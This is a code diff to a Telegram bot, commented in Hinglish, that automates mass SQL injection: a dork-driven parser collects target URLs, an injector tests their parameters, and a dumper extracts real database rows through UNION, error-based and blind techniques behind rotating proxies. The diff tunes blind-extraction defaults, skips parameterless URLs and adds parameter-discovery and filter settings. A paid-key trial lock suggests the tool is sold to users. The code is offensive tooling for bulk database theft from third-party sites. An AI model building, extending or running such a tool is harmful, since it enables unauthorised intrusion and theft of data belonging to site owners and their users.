-           + KV("Blind mode", "on (if page prints nothing)", "🙈") + "\n"
+           + KV("Blind mode", "on — values bhi blind se (%s rows/table)"
+               % fmt(caps.get("blind_rows", 0)), "🙈") + "\n"
            + KV("Request cap", "<code>%s</code> per URL" % fmt(caps["requests"]), "🔋") + "\n"
            + KV("Proxy", "<b>OFF — direct</b> (dump me session same rehna zaroori hai)"
               if not dump_proxy_on() else "<b>ON</b> — <code>/batch dumpproxy 0</code> se band karo",
               "🧅") + "\n\n"
            + B("You get") + "\n"
            + P("one report per URL (DB, tables, columns, rows) + all_rows.csv + zip.")
+           + "\n\n" + B("Farak saaf") + "\n"
+           + P("• SQL DUMP = database se ASLI rows (UNION / error-based / blind).") + "\n"
+           + P("• PAGE HARVEST = page ka data (forms, links, emails, secrets) — SQL rows "
+               "nahi.") + "\n"
+           + P("• URL me query parameter zaroori hai (?id=5) — bina param wali URL "
+               "skip hoti hai, fake param nahi banta.")
            + "\n\n<code>https://target.com/product.php?id=5</code>")
     try:
         await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
@@ -12141,7 +12493,7 @@ def _sqli_caps() -> dict:
             "rows": int(sget("dump_rows", 8) or 8),
             "blind": int(sget("dump_blind", 1) or 0),
             "blind_len": int(sget("dump_blind_len", 24) or 24),
-            "blind_rows": int(sget("dump_blind_rows", 0) or 0),
+            "blind_rows": int(sget("dump_blind_rows", 2) or 0),
             "blind_tables": int(sget("dump_tables", 8) or 8),
             "requests": int(sget("dump_requests", 500) or 500)}
 
@@ -12185,7 +12537,24 @@ async def _run_sqldump(update, context, urls, targets=None, task_id: str = ""):
     uid = str(update.effective_user.id)
     stop_clear(uid)
     tok = stop_mark(uid)
-    urls = _uniq([u for u in urls if str(u).startswith("http")])
+    _all_u = _uniq([u for u in urls if str(u).startswith("http")])
+    #  v2.22.0 — bina query param wali URL par SQL dump ka koi matlab nahi.
+    #  Injector ab fake param nahi banata, isliye dumper bhi sirf asli targets leta hai.
+    _no_param = [u for u in _all_u if not url_has_param(u)]
+    urls = [u for u in _all_u if url_has_param(u)]
+    if not urls:
+        await reply_msg(update).reply_text(
+            (H("SQL DUMP", "0 testable URLs") + "\n\n"
+             + KV("Total URLs", "<code>%s</code>" % fmt(len(_all_u)), "📥") + "\n"
+             + KV("No parameter", "<code>%s</code>" % fmt(len(_no_param)), "🚫") + "\n\n"
+             + P("Dump ke liye URL me query parameter chahiye — <code>?id=5</code>. "
+                 "Bina param wali URL par data nahi nikal sakta (fake param nahi "
+                 "banate — wahi false-positive ka karan tha).")
+             + "\n\n" + P("Injector ke confirmed URLs use karo, ya parser me "
+                             "PARAM filter ON karo.")),
+            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dump"))
+        await_clear(context)
+        return
     tid = task_id or task_new("dump", uid, urls,
                               {"targets": dict(targets or {})},
                               title="SQL Dumper — %d URLs" % len(urls))
@@ -12234,6 +12603,8 @@ async def _run_sqldump(update, context, urls, targets=None, task_id: str = ""):
             + "❖ Tables  : <code>%s</code>\n" % fmt(st["tables"])
             + "❖ Rows    : <code>%s</code>\n" % fmt(st["rows"])
             + "❖ Files   : <code>%s</code>\n" % fmt(len(saved["files"]))
+            + (("🚫 No-param skipped : <code>%s</code>\n" % fmt(len(_no_param)))
+               if _no_param else "")
             + (("⛔ Not tested (stopped): <code>%s</code>\n" % fmt(st.get("skipped", 0)))
                if st.get("skipped") else "")
             + ("⚠️ Large data: <code>%s</code> URL(s) — use a powerful tool\n" % fmt(len(large))
@@ -15625,7 +15996,7 @@ BATCH_KEYS = {
     "dumptables": ("dump_tables", 1, 100, "Dump: tables per URL", 8, "🗃"),
     "dumprows": ("dump_rows", 1, 500, "Dump: rows per table", 8, "📄"),
     "dumpblind": ("dump_blind", 0, 1, "Dump: blind extraction (0/1)", 1, "🙈"),
-    "dumpblindrows": ("dump_blind_rows", 0, 50, "Dump: blind rows per table", 0, "🐢"),
+    "dumpblindrows": ("dump_blind_rows", 0, 50, "Dump: blind rows per table", 2, "🐢"),
     "dumpreq": ("dump_requests", 100, 5000, "Dump: request cap per URL", 500, "🔋"),
     "pages": ("parse_pages", 1, 10, "Parser pages per dork", 1, "📄"),
     "threads": ("parse_threads", 2, 24, "Parser parallel dorks", 12, "🧵"),
@@ -15633,6 +16004,9 @@ BATCH_KEYS = {
     "precheck": ("inj_precheck", 0, 300, "Precheck time cap (s, 0=off)", 45, "🏓"),
     "hostgap": ("inj_host_gap_ms", 0, 2000, "Per-host gap (ms, 0=off)", 50, "⏳"),
     "rawcap":  ("parse_raw_cap", 1000, 1000000, "Parser raw URL cap", 200000, "🧾"),
+    "discover": ("inj_discover", 0, 1, "Injector: param discovery (0/1)", 0, "🔎"),
+    "discovercap": ("inj_discover_cap", 10, 5000, "Discovery: max URLs per scan", 300, "🧭"),
+    "discovernames": ("inj_discover_names", 2, 40, "Discovery: param names per URL", 12, "📛"),
     "tsp":     ("tsp_count", 10, 100000, "TSP dork amount", 2000, "🧰"),
     "tspnum":  ("tsp_numbers", 1, 9999, "TSP number range", 99, "🔢"),
 }
@@ -15651,6 +16025,7 @@ def batch_card() -> str:
         else:
             shown = fmt(val)
         rows.append(KV(label, "<code>%s</code>" % shown, emoji))
+    rows.append(KV("Parser: param filter", "<code>%s</code>" % parse_param_label(), "🔗"))
     return (H("BATCH SETTINGS", "admin") + "\n\n" + "\n".join(rows) + "\n\n"
             "<b>How to set:</b>\n"
             "<code>/batch proxy 4000</code>\n"
@@ -15667,6 +16042,9 @@ def batch_card() -> str:
             "<code>/batch dumpconc 12</code> · <code>/batch dumptime 10</code>\n"
             "<code>/batch dumptables 15</code> · <code>/batch dumprows 50</code>\n"
             "<code>/batch dumpblind 1</code> · <code>/batch dumpreq 800</code>\n"
+            "<code>/batch paramonly 1</code> — parser: sirf param wale URLs " 
+            "(0 = all, auto = dork ke hisaab se)\n"
+            "<code>/batch discover 1</code> — injector: paramless URLs ke asli params\n"
             "<code>/batch trial 1</code> — trial lock ON (files locked)\n\n"
             "<i>Proxy batching checks 60k proxies in slices: 4k → next 4k → … "
             "until every one is done. 2000–4000 is best on a phone.</i>")
@@ -15690,6 +16068,19 @@ async def cmd_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
             % ("ON — users without a key can scan, files locked"
                if on else "OFF — everything normal", batch_card()),
             parse_mode=ParseMode.HTML)
+        return
+    if key == "paramonly":
+        v = str(val).strip().lower()
+        mode = {"1": "1", "on": "1", "only": "1", "0": "0", "all": "0",
+                "auto": "auto", "-1": "auto"}.get(v)
+        if mode is None:
+            await update.effective_message.reply_text(
+                "❌ <code>/batch paramonly auto|1|0</code>", parse_mode=ParseMode.HTML)
+            return
+        sset("parse_param_filter", mode)
+        await update.effective_message.reply_text(
+            "🔗 <b>Parser param filter = %s</b>\n\n%s"
+            % (parse_param_label(mode), batch_card()), parse_mode=ParseMode.HTML)
         return
     if key not in BATCH_KEYS:
         await update.effective_message.reply_text(
